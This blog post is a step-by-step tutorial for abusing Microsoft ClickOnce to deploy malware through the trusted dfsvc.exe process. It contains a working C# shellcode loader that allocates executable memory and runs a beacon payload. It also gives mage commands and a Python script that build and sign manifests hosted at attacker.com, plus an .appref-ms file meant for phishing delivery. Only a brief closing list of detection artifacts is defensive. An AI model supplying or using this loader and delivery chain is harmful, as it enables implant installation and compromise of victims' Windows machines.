---
layout: post
title: "Hijacking ClickOnce"
date: 2025-01-22 19:43:00 +0300
categories: [ClickOnce,PROGRAMMING]
tags: 
pin: false
description: ClickOnce apps launch under the Deployment Service (dfsvc.exe), enabling attackers to proxy execution of malicious payloads through this trusted host.
toc: true
image: /assets/img/ClickOnce/clickonce.jpg
---

# Introduction

ClickOnce is a deployment technology that enables you to create self-updating Windows-based applications that can be installed and run with minimal user interaction. Visual Studio provides full support for publishing and updating applications deployed with ClickOnce technology if you have developed your projects with Visual Basic and Visual C#. For information about deploying Visual C++ applications, see ClickOnce Deployment for Visual C++ Applications.



---

# Hijacking ClickOnce for Malware Deployment

ClickOnce is a Microsoft deployment technology allowing near-zero-interaction app installation. Attackers can weaponize it to deploy implants via trusted Windows processes (`dfsvc.exe`).

---

## Why Use ClickOnce

* Minimal user interaction
* Trusted Microsoft dialogs
* Flexible online/offline deployment
* Easy to sign manifests
* Stealth execution via `dfsvc.exe`

---

## Attack Workflow

### 1. Build Malicious .NET Loader

Example C# loader:

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint size, uint allocType, uint protect);

    [DllImport("kernel32")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint stackSize, IntPtr startAddress, IntPtr param, uint flags, IntPtr threadId);

    [DllImport("msvcrt")]
    static extern IntPtr memcpy(IntPtr dest, byte[] src, uint count);

    static void Main()
    {
        byte[] sc = System.IO.File.ReadAllBytes("beacon.bin");
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
        memcpy(addr, sc, (uint)sc.Length);
        CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }
}
```

Compile with:

```
csc.exe /platform:anycpu /out:evil.exe loader.cs
```

---

### 2. Create Application Manifest

```powershell
mage -New Application `
  -Processor msil `
  -ToFile evil.exe.manifest `
  -Name "EvilApp" `
  -Version 1.0.0.0 `
  -FromDirectory .
```

---

### 3. (Optional) Sign Manifest

```powershell
mage -Sign evil.exe.manifest -CertFile cert.pfx -Password pass
```

---

### 4. Create Deployment Manifest

```powershell
mage -New Deployment `
  -Processor msil `
  -Install true `
  -Publisher "EvilCorp" `
  -ProviderUrl https://attacker.com/evil.application `
  -AppManifest 1.0.0.0\evil.exe.manifest `
  -ToFile evil.application
```

---

### 5. (Optional) Sign Deployment Manifest

```powershell
mage -Sign evil.application -CertFile cert.pfx -Password pass
```

---

### 6. Append `.deploy` Extensions

Rename files:

```
evil.exe.deploy
```

Edit `.application`:

```xml
<deployment install="true" mapFileExtensions="true"/>
```

---

### 7. Example .appref-ms File

UTF-16 LE encoded content:

```
https://attacker.com/evil.application#EvilApp.application, Culture=neutral, PublicKeyToken=0000000000000000, processorArchitecture=msil
```

Double-clicking triggers install.

---

## Automation Example Script

Python to build manifests automatically:

```python
import subprocess

def build_clickonce():
    subprocess.run([
        "mage",
        "-New", "Application",
        "-Processor", "msil",
        "-ToFile", "evil.exe.manifest",
        "-Name", "EvilApp",
        "-Version", "1.0.0.0",
        "-FromDirectory", "."
    ])

    subprocess.run([
        "mage",
        "-New", "Deployment",
        "-Processor", "msil",
        "-Install", "true",
        "-Publisher", "EvilCorp",
        "-ProviderUrl", "https://attacker.com/evil.application",
        "-AppManifest", "1.0.0.0\\evil.exe.manifest",
        "-ToFile", "evil.application"
    ])

build_clickonce()
```

---

## Deployment Options

* Host `evil.application` online.
* Deliver `.appref-ms` file by phishing or shortcut.
* Zip all files for offline install.

---

## Detection Notes

* Child process: `dfsvc.exe`
* Artifacts in `%LOCALAPPDATA%\Apps\2.0\`
* `.application` and `.manifest` files
* Network to `ProviderUrl`

---

